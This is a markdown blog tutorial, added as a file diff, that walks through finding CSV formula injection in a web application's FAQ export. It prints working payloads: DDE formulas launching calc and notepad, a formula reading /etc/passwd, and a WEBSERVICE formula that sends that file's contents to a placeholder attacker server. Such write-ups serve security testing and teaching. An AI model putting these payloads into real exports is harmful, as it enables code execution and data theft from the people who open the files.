@@ -1,0 +1,135 @@
+---
+title: "CSV Formula Injection"
+description: "Tracing how spreadsheet formulas can be injected through exported CSV data."
+slug: "csv-formula-injection"
+date: "2021-01-17"
+author: "Pankaj Mouriya"
+draft: false
+kind: "tutorial"
+tags: ["application-security"]
+security: {"status": "historical"}
+---
+
+Another common security issue which is found these days is CSV injection(CSV - Comma Separated Value). Recently I came across a web application which had this bug and I could not stop myself from writing this blogpost.
+
+
+## Approach
+
+### What made me to test CSV Injection
+Below are few features which made me think to test for CSV injection issue
+
+* Export Functionality in the web application
+* Export as CSV format
+* User input being exported into the CSV
+
+
+## How did I Start ?
+
+### Detection
+
+The web application allowed me to create FAQs(Frequently Asked Question) **sections**. It allowed the user to create new FAQ Sections. And then allowed the user to export all the FAQs into a CSV file which included the CSV title.
+
+Once I knew that the user input was being exported in CSV file, I started with the very basic formula to test if it is vulnerable to CSV injection.  
+
+**The Input Field**
+
+<Figure src="/img/appsec/csv-injections/simpleadd.png" alt="CSV Formula Injection, figure 1" width={621} height={255} />    
+
+
+**Formula Used**  
+`=(2+3)`  
+
+
+**Input Reflected**
+<Figure src="/img/appsec/csv-injections/simpleadd1.png" alt="CSV Formula Injection, figure 2" width={1029} height={215} />   
+
+**CSV Export Option**
+<Figure src="/img/appsec/csv-injections/export1.png" alt="CSV Formula Injection, figure 3" width={759} height={254} />   
+
+
+**CSV File Output** 
+
+<Figure src="/img/appsec/csv-injections/csv-add-simple.png" alt="CSV Formula Injection, figure 4" width={737} height={316} /> 
+
+`2+3 = 5` in the sheet confirmed the CSV Formula Injection Bug
+
+But I still wanted to confirm it using some other input, so I used the HYPERLINK function which I was easily able to find over google and in other blogposts related to CSV injection.
+
+See link in references for **Google Sheets Function List**
+
+```
+HYPERLINK
+Creates a hyperlink inside a cell.
+
+Syntax
+HYPERLINK(url, [link_label])
+```
+
+`=HYPERLINK("https://blog.rootrwx.com","clickme")`
+
+<Figure src="/img/appsec/csv-injections/hyperlink.png" alt="CSV Formula Injection, figure 5" width={1078} height={319} />
+
+**Output**
+
+<Figure src="/img/appsec/csv-injections/hyperlink-excel.png" alt="CSV Formula Injection, figure 6" width={780} height={363} />
+
+When clicked on `click me`, sheets made an external command to open `blog.rootrwx.com` into the browser.
+
+Because I was able to find few payloads over internet [payload all the things repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection). I instantly opened my windows machine to test if the bug works in latest version of windows.
+
+So I injected below payloads to check if I am able to open calc(Calculator) and notepad in windows. When I exported the payloads into CSV file and opened the CSV, I received few popups which said something about "Configuring  DDE (Dynamic Data Exchange) From Trust centre to execute commands". This is not the exact error but it was something like this.
+
+I also recieved another popup box which contained below warning
+
+<Figure src="/img/appsec/csv-injections/error1.png" alt="CSV Formula Injection, figure 7" width={1251} height={249} />
+ 
+**Payload Used**  
+
+`=2+5+cmd|' /C calc'!A0`
+
+<Figure src="/img/appsec/csv-injections/calc2.png" alt="CSV Formula Injection, figure 8" width={1079} height={749} />
+
+`=cmd|' /C notepad'!'A1'`
+
+<Figure src="/img/appsec/csv-injections/notepad-output.png" alt="CSV Formula Injection, figure 9" width={1131} height={669} />
+
+These commands confirmed the issue but they also reduced the severity in windows as it warns the user if the CSV contains such external commands.
+
+I switched back to Linux to move ahead 
+
+### So Whats Next - It is Exfiltration of data
+
+**Payload Used**
+
+`='file:///etc/passwd'#$passwd.A1`
+
+<Figure src="/img/appsec/csv-injections/Selection_830.png" alt="CSV Formula Injection, figure 10" width={738} height={459} />
+
+Next, somehow I wanted to trick the admin or whoever user on the server side opens the file to become victim of this attack. In other words, wanted to make a HTTP call to attacker server from victim machine so that attacker could read the victim user data
+
+After doing some google, I came across `WEBSERVICE` function which helped me to read victim user system files remotely. The below command read victim user `/etc/passwd` file and sent the result of passwd row one data to my remote server.  
+
+**Payload Used**
+
+<Figure src="/img/appsec/csv-injections/Selection_831.png" alt="CSV Formula Injection, figure 11" width={759} height={132} />  
+
+`=WEBSERVICE(CONCATENATE("http://<IP>:5656/",('file:///etc/passwd'#$passwd.A1)))` 
+
+
+<Figure src="/img/appsec/csv-injections/Selection_832.png" alt="CSV Formula Injection, figure 12" width={886} height={174} />  
+
+To play more with exfilteration of data, refer to the [notsosecure.com/data-exfiltration-formula-injection/](https://notsosecure.com/data-exfiltration-formula-injection/) blogpost.
+
+## Prevention
+
+Refer to OWASP CSV Injection post to prevent this security issue [https://owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection)
+
+
+**——-Thank you for reading——–**
+
+## References
+* https://support.google.com/docs/table/25273?hl=en
+* https://notsosecure.com/data-exfiltration-formula-injection/
+* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
+* https://automate.io/blog/google-spreadsheet-formulas/
+* https://owasp.org/www-community/attacks/CSV_Injection
